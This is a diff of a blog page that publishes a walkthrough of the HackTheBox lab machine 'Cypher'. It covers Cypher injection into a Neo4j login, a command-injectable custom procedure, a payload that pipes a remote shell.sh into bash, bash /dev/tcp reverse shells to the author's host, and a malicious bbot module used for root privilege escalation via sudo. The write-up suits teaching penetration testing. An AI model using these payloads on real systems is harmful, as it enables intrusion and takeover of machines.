@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Cypher - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Cypher.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Cypher machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Cypher machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Cypher, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,244 @@
         <h1 class="writeup-title">Cypher</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">July 25, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
                 <p><img alt="pwned" src="../images/Cypher/pwned.png" /></p>
-<p>Cypher is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Cypher retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+<p>Cypher was a medium-difficulty Linux box featuring SSH on port 22 and a custom web application on port 80.
+Initial reconnaissance revealed a login form backed by a Neo4j graph database.
+Testing for cypher injection by inserting a single quote character triggered database errors, confirming the vulnerability in the authentication endpoint.
+Directory enumeration exposed a /testing endpoint containing a downloadable JAR file. Decompiling the Java archive with jd-gui revealed custom Neo4j procedures, including a vulnerable custom.getUrlStatusCode function that executed system commands via curl. The procedure constructed shell commands by directly concatenating user input.
+Exploiting the cypher injection, I crafted a payload that called the vulnerable procedure: test' RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http:thing; curl http://10.10.16.75:8000/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//.
+The semicolon separator bypassed output redirection to /dev/null, allowing command execution and establishing a reverse shell as the neo4j user.</p>
+<p>Local enumeration revealed user graphasm's home directory containing a bbot configuration file with Neo4j credentials (neo4j:cU4btyib.20xtCMCXkBmerhK).
+These credentials provided SSH access as graphasm, who had sudo privileges to run the bbot OSINT tool as root.</p>
+<p>Privilege escalation exploited bbot's custom module loading functionality. By creating a malicious Python module in /tmp/modules with a reverse shell payload in the setup() function and configuring bbot to load custom modules via module_dirs, I achieved root access when the module was executed with sudo privileges.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Cypher/nmap.png" /></p>
+<p>Initial nmap scan reveals 2 ports. SSH on 22 and a website on 80.</p>
+<h2>Cypher injection in the login form</h2>
+<p><img alt="web" src="../images/Cypher/web.png" /></p>
+<p>The demo button redirects me to a login form. I have no credentials, so I'll take a look at the page's source code.</p>
+<p><img alt="script" src="../images/Cypher/script.png" /></p>
+<p>This website uses Neo4j as a database. I will check for cypher injection in the login fields.</p>
+<p>I'll do so by adding a single <code>'</code> character into the username field.</p>
+<p><img alt="error" src="../images/Cypher/error.png" /></p>
+<p>I tried to abuse this injection, however, I was unable to login as the admin. I'll fuzz for directories to see if there is anything else that I can use.</p>
+<h2>Fuzzing the website</h2>
+<p><code>dirsearch -u http://cypher.htb/ --exclude-sizes=22B</code></p>
+<p><img alt="dir" src="../images/Cypher/dir.png" /></p>
+<p>There are two things that interest me here. First, there is an api endpoint, which I think could have something to do with the login process.</p>
+<p>There is also a <code>testing</code> endpoint. I'll begin by checking that one.</p>
+<p><img alt="jar" src="../images/Cypher/jar.png" /></p>
+<p>There is a JAR(Java archive) file available for download. I'll get it onto my box to examine it.</p>
+<p>I will use jd-gui to decompile the archive.</p>
+<h2>JAR file decompilation and analysis</h2>
+<p><img alt="class" src="../images/Cypher/class.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="n">package</span><span class="w"> </span><span class="n">com</span><span class="o">.</span><span class="n">cypher</span><span class="o">.</span><span class="n">neo4j</span><span class="o">.</span><span class="n">apoc</span><span class="p">;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.stream.Stream</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Description</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Mode</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Name</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Procedure</span><span class="p">;</span>
+
+<span class="n">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">HelloWorldProcedure</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nd">@Procedure</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;custom.helloWorld&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Mode</span><span class="o">.</span><span class="n">READ</span><span class="p">)</span>
+<span class="w">  </span><span class="nd">@Description</span><span class="p">(</span><span class="s2">&quot;A simple hello world procedure&quot;</span><span class="p">)</span>
+<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">Stream</span><span class="o">&lt;</span><span class="n">HelloWorldOutput</span><span class="o">&gt;</span><span class="w"> </span><span class="n">helloWorld</span><span class="p">(</span><span class="nd">@Name</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">)</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nb">String</span><span class="w"> </span><span class="n">greeting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hello, &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;!&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">Stream</span><span class="o">.</span><span class="n">of</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">HelloWorldOutput</span><span class="p">(</span><span class="n">greeting</span><span class="p">));</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">HelloWorldOutput</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">greeting</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">HelloWorldOutput</span><span class="p">(</span><span class="nb">String</span><span class="w"> </span><span class="n">greeting</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">greeting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">greeting</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>This is just a simple greeting class that greets the user. Not very interesting, but the second class contains something I could definitely use.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">package</span><span class="w"> </span><span class="n">com</span><span class="o">.</span><span class="n">cypher</span><span class="o">.</span><span class="n">neo4j</span><span class="o">.</span><span class="n">apoc</span><span class="p">;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.InputStreamReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Arrays</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.concurrent.TimeUnit</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.stream.Stream</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Description</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Mode</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Name</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.neo4j.procedure.Procedure</span><span class="p">;</span>
+
+<span class="n">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">CustomFunctions</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nd">@Procedure</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;custom.getUrlStatusCode&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Mode</span><span class="o">.</span><span class="n">READ</span><span class="p">)</span>
+<span class="w">  </span><span class="nd">@Description</span><span class="p">(</span><span class="s2">&quot;Returns the HTTP status code for the given URL as a string&quot;</span><span class="p">)</span>
+<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">Stream</span><span class="o">&lt;</span><span class="n">StringOutput</span><span class="o">&gt;</span><span class="w"> </span><span class="n">getUrlStatusCode</span><span class="p">(</span><span class="nd">@Name</span><span class="p">(</span><span class="s2">&quot;url&quot;</span><span class="p">)</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">url</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">url</span><span class="o">.</span><span class="n">toLowerCase</span><span class="p">()</span><span class="o">.</span><span class="n">startsWith</span><span class="p">(</span><span class="s2">&quot;http://&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">!</span><span class="n">url</span><span class="o">.</span><span class="n">toLowerCase</span><span class="p">()</span><span class="o">.</span><span class="n">startsWith</span><span class="p">(</span><span class="s2">&quot;https://&quot;</span><span class="p">))</span>
+<span class="w">      </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">url</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nb">String</span><span class="p">[]</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;curl -s -o /dev/null --connect-timeout 1 -w %</span><span class="si">{http_code}</span><span class="s2"> &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="p">};</span>
+<span class="w">    </span><span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Command: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Arrays</span><span class="o">.</span><span class="n">toString</span><span class="p">((</span><span class="n">Object</span><span class="p">[])</span><span class="n">command</span><span class="p">));</span>
+<span class="w">    </span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+<span class="w">    </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">inputReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">()));</span>
+<span class="w">    </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">errorReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">getErrorStream</span><span class="p">()));</span>
+<span class="w">    </span><span class="n">StringBuilder</span><span class="w"> </span><span class="n">errorOutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">StringBuilder</span><span class="p">();</span>
+<span class="w">    </span><span class="nb">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">errorReader</span><span class="o">.</span><span class="n">readLine</span><span class="p">())</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">null</span><span class="p">)</span>
+<span class="w">      </span><span class="n">errorOutput</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span><span class="w"> </span>
+<span class="w">    </span><span class="nb">String</span><span class="w"> </span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inputReader</span><span class="o">.</span><span class="n">readLine</span><span class="p">();</span>
+<span class="w">    </span><span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Status code: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">statusCode</span><span class="p">);</span>
+<span class="w">    </span><span class="n">boolean</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">process</span><span class="o">.</span><span class="n">waitFor</span><span class="p">(</span><span class="mi">10</span><span class="n">L</span><span class="p">,</span><span class="w"> </span><span class="n">TimeUnit</span><span class="o">.</span><span class="n">SECONDS</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!</span><span class="n">exited</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">process</span><span class="o">.</span><span class="n">destroyForcibly</span><span class="p">();</span>
+<span class="w">      </span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="p">;</span>
+<span class="w">      </span><span class="n">System</span><span class="o">.</span><span class="n">err</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Process timed out after 10 seconds&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nb">int</span><span class="w"> </span><span class="n">exitCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">process</span><span class="o">.</span><span class="n">exitValue</span><span class="p">();</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">exitCode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="n">System</span><span class="o">.</span><span class="n">err</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Process exited with code &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">exitCode</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">errorOutput</span><span class="o">.</span><span class="n">length</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
+<span class="w">      </span><span class="n">System</span><span class="o">.</span><span class="n">err</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&quot;Error output:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">errorOutput</span><span class="o">.</span><span class="n">toString</span><span class="p">());</span><span class="w"> </span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">Stream</span><span class="o">.</span><span class="n">of</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">StringOutput</span><span class="p">(</span><span class="n">statusCode</span><span class="p">));</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">static</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">StringOutput</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="nb">String</span><span class="w"> </span><span class="n">statusCode</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">StringOutput</span><span class="p">(</span><span class="nb">String</span><span class="w"> </span><span class="n">statusCode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">this</span><span class="o">.</span><span class="n">statusCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statusCode</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>If I can somehow call the <code>custom.getUrlStatusCode</code> procedure, I'll be able to achieve code execution. By passing in the http address like this <code>custom.getUrlStatusCode('http://10.10.16.75/test')</code>, I'll be able to make it call back to my server.</p>
+<h2>Shell as neo4j</h2>
+<p>Just to confirm the target endpoint, I ran dirsearch again.</p>
+<p><img alt="auth" src="../images/Cypher/auth.png" /></p>
+<p>I will send my command to that endpoint. That should allow me to interact with the login fields.</p>
+<p><code>export cmd="test' RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http://10.10.16.75:8000/test') YIELD statusCode AS hash RETURN hash;//"</code></p>
+<p>I exported the command to avoid issues with the quote characters.</p>
+<p>Next, I will use curl to send this command to the auth endpoint.</p>
+<p><code>curl -X POST "http://cypher.htb/api/auth" -H "Content-Type: application/json" --data "{\"username\": \"${cmd}\", \"password\": \"pass\"}"</code></p>
+<p>It returns a <code>{"detail":"Invalid credentials"}</code> error message, but ended up reaching out to my python server regardless.</p>
+<p><img alt="python" src="../images/Cypher/python.png" /></p>
+<p>I'll prepare a single reverse shell file, and I'll modify my command slightly.</p>
+<div class="codehilite"><pre><span></span><code># shell.sh
+
+#!/bin/bash
+
+bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.75/9001 0&gt;&amp;1&#39;
+</code></pre></div>
+
+<p>However, nothing happens to my netcat listener. This is because of the <code>-o /dev/null</code> part in the vulnerable bash command. It'll throw away everything that curl tries to pass, but this can be solved rather easily.</p>
+<p>I'll add a separator <code>;</code> at the end, and then I'll repeat the curl command, which should work as intended. I'll then pipe the shell command into bash.</p>
+<p><code>export cmd="test' RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http:thing; curl http://10.10.16.75:8000/shell.sh | bash') YIELD statusCode AS hash RETURN hash;//"</code></p>
+<p>The shell hit my listener almost instantly.</p>
+<p><img alt="shell" src="../images/Cypher/shell.png" /></p>
+<p>On the box, I began searching around and found a user whose home directory I could enter.</p>
+<p><img alt="directory" src="../images/Cypher/directory.png" /></p>
+<p>While I cannot read the user flag yet, I can take a look at the .yml config file.</p>
+<div class="codehilite"><pre><span></span><code>targets:
+  <span class="k">-</span> ecorp.htb
+
+output_dir: /home/graphasm/bbot_scans
+
+config:
+  modules:
+    neo4j:
+      username: neo4j
+      password: cU4btyib.20xtCMCXkBmerhK
+</code></pre></div>
+
+<p>There is a password. I will try logging into the box as graphasm with these credentials.</p>
+<p><img alt="user" src="../images/Cypher/user.png" /></p>
+<h1>Root flag</h1>
+<h2>Looking for a privesc opportunity</h2>
+<p><img alt="sudol" src="../images/Cypher/sudol.png" /></p>
+<p>Graphasm can run <code>bbot</code> as root, which is some sort of an OSINT tool.</p>
+<p>Looking at its help menu, there are a few interesting options.</p>
+<div class="codehilite"><pre><span></span><code>  -c [CONFIG ...], --config [CONFIG ...]
+                        Custom config options in key=value format: e.g. &#39;modules.shodan.api_key=1234&#39;
+
+  --dry-run             Abort before executing scan
+
+  -d, --debug           Enable debugging
+</code></pre></div>
+
+<p>And a few more. If I can specify <code>anything</code> as a config input, and the debug options will allow for more verbose data sendback, I could read files like root's SSH key or the /etc/shadow file.</p>
+<p><code>sudo /usr/local/bin/bbot --dry-run -d -c /etc/shadow</code></p>
+<p>However, this returned an error.</p>
+<p>I managed to get the desired output by adding a <code>y</code> to the -c flag.</p>
+<p><img alt="shadow" src="../images/Cypher/shadow.png" /></p>
+<h2>Getting a root shell</h2>
+<p>When I tried grabbing root's SSH key at <code>/root/authorized_keys</code>, nothing was displayed back.</p>
+<p>I began wondering whether it is possible to do other things using bbot, and I found the program's developer manual.</p>
+<p><code>https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/#create-the-python-file</code></p>
+<p>I copied over the example module, and made a few edits.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">bbot.modules.base</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="n">BaseModule</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">whois</span><span class="p">(</span><span class="n">BaseModule</span><span class="p">):</span>
+<span class="w">    </span><span class="n">watched_events</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;DNS_NAME&quot;</span><span class="p">]</span><span class="w"> </span><span class="c1"># watch for DNS_NAME events</span>
+<span class="w">    </span><span class="n">produced_events</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;WHOIS&quot;</span><span class="p">]</span><span class="w"> </span><span class="c1"># we produce WHOIS events</span>
+<span class="w">    </span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;passive&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;safe&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">meta</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Query WhoisXMLAPI for WHOIS data&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;api_key&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">}</span><span class="w"> </span><span class="c1"># module config options</span>
+<span class="w">    </span><span class="n">options_desc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;api_key&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;WhoisXMLAPI Key&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">per_domain_only</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">True</span><span class="w"> </span><span class="c1"># only run once per domain</span>
+
+<span class="w">    </span><span class="n">base_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://www.whoisxmlapi.com/whoisserver/WhoisService&quot;</span>
+
+<span class="w">    </span><span class="c1"># one-time setup - runs at the beginning of the scan</span>
+<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="k">def</span><span class="w"> </span><span class="nf">setup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.75/9001 0&gt;&amp;1&#39;&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">api_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;api_key&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">api_key</span><span class="p">:</span>
+<span class="w">            </span><span class="c1"># soft-fail if no API key is set</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">None</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Must set API key&quot;</span>
+
+<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="k">def</span><span class="w"> </span><span class="nf">handle_event</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">event</span><span class="p">):</span>
+<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">hugesuccess</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Got </span><span class="si">{</span><span class="n">event</span><span class="si">}</span><span class="s2"> (event.data: </span><span class="si">{</span><span class="n">event</span><span class="o">.</span><span class="n">data</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="n">_</span><span class="p">,</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">helpers</span><span class="o">.</span><span class="n">split_domain</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+<span class="w">        </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s2">?apiKey=</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">api_key</span><span class="si">}</span><span class="s2">&amp;domainName=</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&amp;outputFormat=JSON&quot;</span>
+<span class="w">        </span><span class="bp">self</span><span class="o">.</span><span class="n">hugeinfo</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Visiting </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="n">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">helpers</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="ow">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="kc">None</span><span class="p">:</span>
+<span class="w">            </span><span class="k">await</span><span class="w"> </span><span class="bp">self</span><span class="o">.</span><span class="n">emit_event</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">(),</span><span class="w"> </span><span class="s2">&quot;WHOIS&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">parent</span><span class="o">=</span><span class="n">event</span><span class="p">)</span>
+</code></pre></div>
+
+<p>When I run this module, I should receive a root shell on my listener.</p>
+<p>There are a few things that need to be done before though. First, I'll make a <code>/tmp/modules</code> directory, to not interfere with the regular bbot modules.</p>
+<p>Then, I'll create a conf.yml file containing the following lines:</p>
+<div class="codehilite"><pre><span></span><code>targets:
+  <span class="k">-</span> ecorp.htb
+
+output_dir: /home/graphasm/bbot_scans
+module_dirs:
+  <span class="k">-</span> /tmp/modules
+
+config:
+  modules:
+    neo4j:
+      username: neo4j
+      password: cU4btyib.20xtCMCXkBmerhK
+</code></pre></div>
+
+<p>I copied the original bbot config, but added the module_dirs entry as instructed in the developer manual.</p>
+<p>I placed the malicious module in the modules directory and ran this command.</p>
+<p><code>sudo /usr/local/bin/bbot -p ./conf.yml -m whois</code></p>
+<p><img alt="root" src="../images/Cypher/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
